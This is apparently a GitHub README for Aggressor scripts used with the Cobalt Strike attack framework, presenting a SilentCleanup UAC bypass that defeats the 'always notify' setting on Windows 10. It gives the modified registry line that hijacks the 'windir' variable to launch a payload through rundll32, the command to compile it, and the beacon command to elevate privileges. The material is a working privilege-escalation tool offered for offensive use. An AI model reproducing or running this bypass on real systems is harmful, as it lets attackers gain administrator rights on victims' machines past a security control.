# Aggressor-Scripts
Aggressor scripts for Cobalt Strike

## UAC Bypass - Silent Cleanup
This is a cna for the silentcleanup UAC bypass that bypasses "always notify" aka the highest UAC setting, even on Windows 10 (1903) as per april 2019. You can find details [here](https://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-disk-cleanup/).

This requires [plaintext](https://github.com/juliourena/plaintext)'s C# port of the bypass, which can be found [here](https://github.com/juliourena/plaintext/blob/master/CSharp%20Tools/UAC%20Bypass/uac_bypass_silentcleanup.cs).
I had to modify it slightly to make it execute a dll instead of an exe. I have uploaded my modified version where I have changed line 43 from

    key.SetValue("windir", "cmd.exe /k " + payload + " & ", RegistryValueKind.String);

to

    key.SetValue("windir", "rundll32.exe " + payload + " & ", RegistryValueKind.String);

I have also uploaded a compiled exe of this, which is hard coded by name in the cna under the folder modules. It was compiled with csc.exe

     C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe .\uac_bypass_silentcleanup.cs

Run it from CS with

    beacon > elevate uac-silentcleanup <listener>